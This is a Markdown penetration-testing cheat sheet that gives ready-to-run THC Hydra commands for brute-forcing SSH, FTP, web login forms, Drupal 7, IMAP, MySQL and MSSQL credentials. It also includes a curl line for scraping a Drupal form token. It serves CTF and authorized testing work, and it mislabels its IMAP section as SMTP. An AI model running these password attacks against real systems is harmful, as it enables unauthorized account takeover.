# THC Hydra
[THC Hydra](https://sectools.org/tool/hydra/) is a tool commonly used to brute force user credentials. Always remember that you are at the mercy of your wordlists during these types of attacks. The longer, more accurate/finely-tuned wordlist = the fatser you get positive results.
## SSH
To brute force SSH credentials, use the following command. This will brute force the credentials for the `root` user.

```
root@kali:~# hydra -l root -P /wordlists/rockyou.txt (target ip address) ssh
[WARNING] Many SSH configurations limit the number of parallel tasks, it is \
recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344423 login tries (l:1/p:0), ~14344423 tries per task

```

## FTP
To brute for an FTP service with a known username try the following command.

`hydra -l (UID) -P /path/to/500-worst-passwords.txt (TARGET IP ADDRESS) ftp`

## HTTP
To brute for an HTTP form, try the following syntax with `hydra`:
### HTTP POST Form
`hydra -l (USERNAME) -P /path/to/wordlist.txt (TARGET IP ADDRESS) http-post-form "/URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^&(HTML FORM PASSWORD ATTRIBUTE)=^PASS^&Login=Login:(FAILED LOGIN MESSAGE)"`

Where `HTML FORM USERNAME ATTRIBUTE` is the HTML form username "name" attribute. E.g.: `<input type=text name="username" />` In that example, the `username` value for the attribute `name` is what would be used. Same gfoes for the password: `<input type=password name="passwd" />` In that exmaple `passwd` would be used to construct the command as it is the value of the password input's name attribute. The command would then look something like so:

  ... `:username=^USER^&passwd=^PASS^` ...
  
  `hydra` will fill in the `^USER^` and `^PASS^` values upon every single HTTP request with each username and password that you mean to test.
### HTTP GET Form
The GET parameters, that you seein the URL bar, are rarely used for HTTP authentication. This is because developers do not want to make your username and password "bookmarkable." Some cases in CTF, penetratiuon testing, etc, beg to differ. To perform a GET request for a password brute force, you must understand there are some caveats. 
1. You cannot use certain characters in your password. 
This is because of the URL/HTTP transport encoding. FOr instance, sometimes a "#" in a password from `rockyou.txt` will cause an HTTP 400 Bad Request repose from the server.

Let's take a look at an HTTP GET login password brute force attempt using THC-Hydra,
```
root@attacker-machine:~# hydra -l admin -P /pwnt/passwords/wordlists/rockyou.txt (TARGET IP ADDRESS) http-get-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Please Login|Bad Request"
```
As you can see, I used a pipe "|" to say "OR" to ignore Error 400 Bad Request responses form the target server.

### Drupal 7
In Drupal 7 we need to first get the form_build_id from the `./user/` directory as so,
```
root@wnl8:~# curl -s http://drupal.site/user/ | grep form_build_id | cut -d "\"" -f 6
```
Alternatively, if this does not provide a string, like, `form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw` for example, then simply hit CTRL+U on the `./user/` page and search for "form_build_id"
Next, we can use Hydra on Drupal as so,
```
hydra -l admin -P /wordlists/rockyou.txt (TARGET DRUPAL IP) http-form-post "/?q=user/:name=admin&pass=^PASS^&form_id=user_login&form_build_id=form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw:Sorry
```
And as you see, I have inserted the Drupal form ID and I am attempting to brute force the `admin` user.

## SMTP (IMAP SSL)
To brute force SMTP via SSL Authentication, you must first enumerate which port ssl/imap is runniing on using `nmap`. In our case, we found port 993 as,

```
993/tcp  open  ssl/imap   Dovecot imapd
|_imap-capabilities: ID more IDLE have IMAP4rev1 ENABLE LOGIN-REFERRALS SASL-IR LITERAL+ listed capabilities Pre-login post-login AUTH=PLAINA0001 OK
```

We also need to enumerate a valid username. We can hlearn how to do so from the [SMTP User Enumeration Module](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Enumeration/smtp-user-enumeration.md). After gathering these two pieces of information, we can use `hydra` to try to brute force the authentication like so:

`root@kali:~# hydra (TARGET IP ADDRESS) smtp -l (USERNAME) -P /path/to/wordlist.txt -V -s (TARGET PORT)`

## MySQL
To brute force MySQL services (usually running on port 3306 of the target system), use the following syntax with THC-Hydra,
```
root@attacker-system:~# hydra -l root -P /path/to/wordlist.txt (TARGET IP ADDRESS) mysql
```

## MSSQL
```
root@demon:~# hydra -l sa –P /path/to/rockyou.txt 10.10.10.125 mssql
```
